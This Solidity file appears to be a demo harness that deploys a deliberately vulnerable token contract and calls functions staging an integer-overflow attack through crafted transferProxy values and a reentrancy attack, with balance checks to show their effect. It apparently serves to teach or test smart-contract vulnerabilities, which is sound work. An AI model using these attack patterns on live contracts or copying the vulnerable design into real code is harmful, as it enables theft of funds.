// SPDX-License-Identifier: MIT

import './MultiVulnToken.sol';
import './reentrancy_attack.sol';
import './no_reentrancy_attack.sol';

pragma solidity >=0.8.4;

contract Demo {
    MultiVulnToken MultiVulnTokenContractAddress;

    address attacker1Address =
        address(0x92349Ef835BA7Ea6590C3947Db6A11EeE1a90cFd); //just an arbitrary address
    reentrancy_attack attacker2Address1;
    address attacker2Address2 =
        address(0x0Ce8dAf9acbA5111C12B38420f848396eD71Cb3E); //just an arbitrary address
    no_reentrancy_attack benignUserAddress1;
    address benignUserAddress2 =
        address(0x71C7656EC7ab88b098defB751B7401B5f6d8976F); //just an arbitrary address

    constructor() {
        MultiVulnTokenContractAddress = new MultiVulnToken(1000);
        attacker2Address1 = new reentrancy_attack(address(MultiVulnTokenContractAddress),attacker2Address2);
        benignUserAddress1 = new no_reentrancy_attack(address(MultiVulnTokenContractAddress),benignUserAddress2);

        //suppose attacker2Address1 has 5 tokens initially
        MultiVulnTokenContractAddress.transferProxy(
            address(this),
            address(attacker2Address1),
            5,
            0
        );

        //suppose benignUserAddress has 5 tokens too
        MultiVulnTokenContractAddress.transferProxy(
            address(this),
            address(benignUserAddress1),
            5,
            0
        );
    }

    function getBalanceOfAttacker1() public view returns (uint256) {
        return MultiVulnTokenContractAddress.balanceOf(attacker1Address);
    }

    function attack1_int_overflow() public {
        MultiVulnTokenContractAddress.transferProxy(
            address(this),
            attacker1Address,
            uint256(2 ** 255 + 1),
            uint256(2 ** 255)
        );
    }

    function getBalanceOfAttacker2() public view returns (uint256) {
        return
            MultiVulnTokenContractAddress.balanceOf(
                address(attacker2Address1)
            ) + MultiVulnTokenContractAddress.balanceOf(attacker2Address2);
    }

    function attack2_reentrancy() public {
        attacker2Address1.attack();
    }

    function getBenignUserBal() public view returns (uint256) {
        return
            MultiVulnTokenContractAddress.balanceOf(
                address(benignUserAddress1)
            ) +
            MultiVulnTokenContractAddress.balanceOf(
                address(benignUserAddress2)
            );
    }

    function no_reentrancy() public {
        benignUserAddress1.call_clear();
    }
}
